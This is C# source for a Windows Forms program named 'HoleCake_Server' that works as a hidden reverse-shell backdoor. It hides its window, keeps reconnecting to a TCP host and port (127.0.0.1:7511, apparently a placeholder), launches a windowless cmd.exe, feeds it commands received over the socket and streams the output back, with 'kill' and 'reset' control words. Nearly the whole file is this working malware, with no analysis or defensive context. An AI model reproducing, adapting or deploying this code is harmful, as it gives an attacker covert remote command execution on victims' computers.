using System.Threading;

using System.Threading.Tasks;

using System.IO;

using System;

using System.Collections.Generic;

using System.ComponentModel;

using System.Data;

using System.Drawing;

using System.Text;

using System.Windows.Forms;

using System.Net.Sockets;
           
using System.Diagnostics;   



namespace HoleCake_Server

{
    public partial class Form1 : Form
  
    {
        TcpClient TCPC;
       
        NetworkStream NS;
        
        StreamWriter SW;
        
        StreamReader SR;
        
        Process proShell;
        
        StringBuilder SIP;



        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Shown(object sender, EventArgs e)
        {
            this.Hide();
           
            for (; ; )
          
            {
               Server();
               
                Thread.Sleep(new Random().Next(1000, 5000)); // 5 Sek bis zum Verbindungsaufbau
                                                        
            }
        }

        private void Server()
       
        {
          
            TCPC = new TcpClient();
          
            SIP = new StringBuilder();
          
            if (!TCPC.Connected)
                  
            {
              
                try
              
                {
              
                    TCPC.Connect("127.0.0.1", 7511);
                
                    NS = TCPC.GetStream();
               
                    SR = new StreamReader(NS);
               
                    SW = new StreamWriter(NS);
             
                }
            
                catch (Exception err) { return; } //

                proShell = new Process();
             
                proShell.StartInfo.FileName = "cmd.exe";
             
                proShell.StartInfo.CreateNoWindow = true;
              
                proShell.StartInfo.UseShellExecute = false;
              
                proShell.StartInfo.RedirectStandardOutput = true;
              
                proShell.StartInfo.RedirectStandardInput = true;
              
                proShell.StartInfo.RedirectStandardError = true;
             
                proShell.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
             
                proShell.Start();
             
                proShell.BeginOutputReadLine();
           
            }

            while (true)
          
            {
           
                try
           
                {
                 
                    SIP.Append(SR.ReadLine());
                 
                    SIP.Append("\n");
                
                    if (SIP.ToString().LastIndexOf("kill") >= 0) StopServer();
                
                    if (SIP.ToString().LastIndexOf("reset") >= 0) throw new ArgumentException();
                
                    proShell.StandardInput.WriteLine(SIP);
               
                    SIP.Remove(0, SIP.Length);
              
                }
               
                catch (Exception err)
              
                {
                
                    ausmisten();
                  
                    break;
                }
            }

        }

        private void ausmisten()
     
        {
          
            try { proShell.Kill(); } catch (Exception err) { };
          
            SR.Close();
         
            SW.Close();
        
            NS.Close();
       
        }

        private void StopServer()
     
        {
          
            ausmisten();
       
            System.Environment.Exit(System.Environment.ExitCode);
     
        }

        private void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
       
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
         
            {
             
                try
            
                {
                    strOutput.Append(outLine.Data);
                  
                    SW.WriteLine(strOutput);
                 
                    SW.Flush();
            
                }
                catch (Exception err) { }

            }
        }

        private void Form1_Load(object sender, EventArgs e)
     
        {
            BeginInvoke(new MethodInvoker(delegate { Hide(); }));
       
        }
   
    }

}